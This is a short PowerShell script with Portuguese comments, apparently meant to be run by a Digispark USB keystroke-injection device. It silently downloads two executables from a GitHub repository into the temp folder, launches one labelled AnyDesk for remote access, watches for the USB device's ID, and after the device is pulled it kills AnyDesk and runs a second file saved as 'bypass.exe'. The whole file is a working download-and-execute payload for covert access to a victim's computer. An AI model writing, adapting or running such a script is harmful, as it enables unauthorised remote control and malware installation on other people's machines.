$p = "$env:TEMP\main.exe"
$b = "$env:TEMP\bypass.exe"
$n = "AnyDesk"

# Baixa os arquivos silenciosamente
Invoke-WebRequest -Uri "https://github.com/nohanvs/bot-dc-dipariss7k/raw/refs/heads/main/AnyDesk.exe" -OutFile $p
Invoke-WebRequest -Uri "https://github.com/nohanvs/bot-dc-dipariss7k/raw/refs/heads/main/SYNC-Otimizer.exe" -OutFile $b

# Inicia o principal (AnyDesk)
Start-Process $p

# Espera 5 segundos para garantir que o Windows já reconheceu o teclado
Start-Sleep -Seconds 5

# Loop Vigilante: Fica monitorando o ID EXATO do seu Digispark (1C4F)
while ($true) {
    $usb = Get-WmiObject Win32_PnPEntity | Where-Object { $_.DeviceID -match '1C4F' }
    
    if (-not $usb) {
        # Sumiu? Espera 2 segundos para a Prova Real (evita falsos alertas)
        Start-Sleep -Seconds 2
        $confirm = Get-WmiObject Win32_PnPEntity | Where-Object { $_.DeviceID -match '1C4F' }
        
        if (-not $confirm) {
            # Desplugado com sucesso! Quebra o loop para fechar tudo.
            break
        }
    }
    Start-Sleep -Seconds 1
}

# Só chega nesta linha quando você puxa o Digispark
# Fecha o AnyDesk forçadamente e abre o Otimizador
Stop-Process -Name $n -Force -ErrorAction SilentlyContinue
Start-Process $b
